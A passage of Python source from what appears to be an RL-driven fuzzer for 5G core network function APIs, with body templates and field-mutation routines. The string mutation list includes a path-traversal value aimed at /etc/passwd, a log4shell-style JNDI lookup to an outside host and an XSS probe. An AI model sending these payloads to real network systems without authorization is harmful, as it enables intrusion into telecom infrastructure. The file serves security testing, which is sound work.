        body_dict = amf_n1n2_garbage_nas(supi, pdu_sid, mcc, mnc)

    elif template_name == 'amf_n1n2_oversized_nas':
        body_dict = amf_n1n2_oversized_nas(supi, pdu_sid)

    elif template_name == 'amf_n1n2_empty_nas':
        body_dict = amf_n1n2_empty_nas(supi, pdu_sid)

    elif template_name == 'amf_ue_ctx_no_supi':
        body_dict = amf_ue_ctx_no_supi(mcc, mnc, sst)

    elif template_name == 'amf_ue_ctx_bad_plmn':
        body_dict = amf_ue_ctx_bad_plmn(supi, sst)

    # GET / DELETE requests: no body
    elif template_name in ('nrf_nf_discover', 'nrf_nf_deregister',
                           'smf_ctx_delete', 'amf_ue_ctx_get',
                           'nrf_plmn_overflow', 'udm_psi_zero',
                           'udr_prefix_supi', 'udr_prefix_supi_sub',
                           # generic path-fuzz GET targets (body built from path only)
                           'udm_smf_reg_psi_fuzz', 'udr_policy_supi_fuzz',
                           'udr_sub_supi_fuzz', 'udr_sub_provisioned_fuzz',
                           # cross-platform GET targets
                           'nrf_disc_gpsi', 'nrf_disc_snssai_fuzz', 'udm_sdm_shared_data',
                           # PCF/NSSF/BSF GET targets
                           'pcf_sm_policy_get', 'nssf_nsselection',
                           'nssf_nsselection_empty_snssai', 'nssf_nsselection_bad_plmn',
                           'bsf_pcf_binding_get',
                           # DELETE-only targets
                           'pcf_sm_policy_delete', 'pcf_am_policy_delete',
                           'bsf_pcf_binding_delete', 'chf_charging_release',
                           'nssf_nssai_availability_delete',
                           # NRF gap-fill GETs
                           'nrf_disc_no_params',
                           # SMF gap-fill DELETE
                           'smf_ctx_modify_no_ctx',
                           # UDM SDM subscription DELETE (lifecycle chain)
                           'udm_sdm_sub_delete'):
        return b''

    # Oversized body variant: cycle through OVERSIZED_BODIES by pdu_session_id
    elif template_name == 'oversized':
        idx = pdu_sid % len(OVERSIZED_BODIES)
        return OVERSIZED_BODIES[idx]

    if body_dict is None:
        return b''
    return json.dumps(body_dict, separators=(',', ':')).encode()


# ---------------------------------------------------------------------------
# Generic body leaf-field mutation
# ---------------------------------------------------------------------------

# Mutations applied to individual leaf values.  Grouped by the type of the
# original leaf so the caller can pick an appropriate mutation for any field.
#
# String mutations: cover empty, oversized, format violations, null injection,
#   type confusion (int/bool/null where string expected).
# Int/float mutations: boundaries, sign flip, type confusion.
# Bool mutations: type confusion (string/int where bool expected).
#
# The 'drop' sentinel is handled specially: the key is removed from the body,
# exercising handlers that assume required fields are always present.
_DROP_SENTINEL = '__DROP__'

_STRING_MUTATIONS: List[Any] = [
    '',                         # empty — common NULL/empty check failure
    'A' * 256,                  # oversized — buffer boundary
    'A' * 4096,                 # very oversized — large allocation
    '\x00',                     # null byte — C string truncation
    'foo\x00bar',               # embedded null
    '\xff\xfe',                 # invalid UTF-8 bytes
    '\u202e\u0041\u202c',       # Unicode bidi override
    '../../../etc/passwd',      # path traversal
    '${jndi:ldap://x}',        # log4shell-style injection
    '<script>alert(1)</script>',# XSS probe
    'null',                     # string "null"
    'true',                     # string "true" — type confusion
    '0',                        # string "0"
    '-1',                       # string negative
    ' ',                        # whitespace-only
    _DROP_SENTINEL,             # remove field entirely
]

_INT_MUTATIONS: List[Any] = [
    0,
    -1,
    -2147483648,        # INT32_MIN
    2147483647,         # INT32_MAX
    2147483648,         # INT32_MAX+1 — overflow
    4294967295,         # UINT32_MAX
    4294967296,         # UINT32_MAX+1
    9007199254740991,   # Number.MAX_SAFE_INTEGER (JS boundary)
    '',                 # empty string — type confusion
    'NaN',              # NaN string
    None,               # null — type confusion
    _DROP_SENTINEL,
]

_BOOL_MUTATIONS: List[Any] = [
    'true',     # string instead of bool
    'false',
    1,          # int instead of bool
    0,
    None,       # null
    _DROP_SENTINEL,
]


def _collect_leaf_paths(obj: Any, prefix: str = '') -> List[Tuple[str, str]]:
    """Return list of (dotted.path, type) for every leaf in *obj*.

    Type is 'str', 'int', 'float', 'bool', or 'null'.
    Array elements are indexed as 'field.0', 'field.1', etc.
    """
    paths: List[Tuple[str, str]] = []
    if isinstance(obj, dict):
        for k, v in obj.items():
            child = f'{prefix}.{k}' if prefix else k
            paths.extend(_collect_leaf_paths(v, child))
    elif isinstance(obj, list):
        for i, v in enumerate(obj):
            child = f'{prefix}.{i}' if prefix else str(i)
            paths.extend(_collect_leaf_paths(v, child))
    else:
        if isinstance(obj, bool):
            type_tag = 'bool'
        elif isinstance(obj, int):
            type_tag = 'int'
        elif isinstance(obj, float):
            type_tag = 'float'
        elif isinstance(obj, str):
            type_tag = 'str'
        else:
            type_tag = 'null'
        paths.append((prefix, type_tag))
    return paths


def _set_leaf(obj: Any, path_parts: List[str], value: Any) -> Any:
    """Return a deep copy of *obj* with the leaf at *path_parts* set to *value*.

    If *value* is _DROP_SENTINEL the key/index is removed instead.
    """
    import copy
    obj = copy.deepcopy(obj)
    node = obj
    for part in path_parts[:-1]:
        if isinstance(node, list):
            node = node[int(part)]
        else:
            node = node[part]
    last = path_parts[-1]
    if value is _DROP_SENTINEL:
        if isinstance(node, list):
            del node[int(last)]
        elif isinstance(node, dict):
            node.pop(last, None)
    else:
        if isinstance(node, list):
            node[int(last)] = value
        else:
            node[last] = value
    return obj


def get_body_fuzz_variants(template_name: str,
                           fields: Dict[str, Any]) -> List[Tuple[str, str, Any]]:
    """Return all (field_path, mutation_label, mutated_body_bytes) variants.

    Builds the base body for *template_name*, finds every leaf field, and
    applies every type-appropriate mutation.  Returns a list of
    (dotted_field_path, mutation_label, body_bytes) triples so the adapter
    can register each as a distinct RL action.

    Only templates that produce a non-empty JSON body are processed.
    """
    base_bytes = build_body(template_name, fields)
    if not base_bytes:
        return []
    try:
        base_dict = json.loads(base_bytes)
    except (ValueError, TypeError):
        return []

    results: List[Tuple[str, str, Any]] = []
    for path, type_tag in _collect_leaf_paths(base_dict):
        parts = path.split('.')
        if type_tag == 'str':
            mutations = _STRING_MUTATIONS
        elif type_tag in ('int', 'float'):
            mutations = _INT_MUTATIONS
        elif type_tag == 'bool':
            mutations = _BOOL_MUTATIONS
        else:
            mutations = [None, _DROP_SENTINEL]

        for mut_val in mutations:
            label = 'drop' if mut_val is _DROP_SENTINEL else repr(mut_val)[:32]
            try:
                mutated = _set_leaf(base_dict, parts, mut_val)
                body_bytes = json.dumps(mutated, separators=(',', ':')).encode()
                results.append((path, label, body_bytes))
            except (KeyError, IndexError, TypeError):
                pass
    return results


def apply_body_field_mutation(template_name: str, fields: Dict[str, Any],
                              field_path: str, mutation_idx: int) -> bytes:
    """Build *template_name* body and apply the *mutation_idx*-th mutation
    to the leaf at *field_path*.

    Used at runtime by the RL agent when it selects a body_fuzz action.
    Returns the mutated body bytes, or the unmodified base body on error.
    """
    base_bytes = build_body(template_name, fields)
    if not base_bytes:
        return base_bytes
    try:
        base_dict = json.loads(base_bytes)
    except (ValueError, TypeError):
        return base_bytes

    leaf_paths = _collect_leaf_paths(base_dict)
    path_map: Dict[str, str] = {p: t for p, t in leaf_paths}
    type_tag = path_map.get(field_path, 'str')

    if type_tag == 'str':
        mutations = _STRING_MUTATIONS
    elif type_tag in ('int', 'float'):
        mutations = _INT_MUTATIONS
    elif type_tag == 'bool':
        mutations = _BOOL_MUTATIONS
    else:
        mutations = [None, _DROP_SENTINEL]

    mut_val = mutations[mutation_idx % len(mutations)]
    parts = field_path.split('.')
    try:
        mutated = _set_leaf(base_dict, parts, mut_val)
        return json.dumps(mutated, separators=(',', ':')).encode()
    except (KeyError, IndexError, TypeError):
        return base_bytes
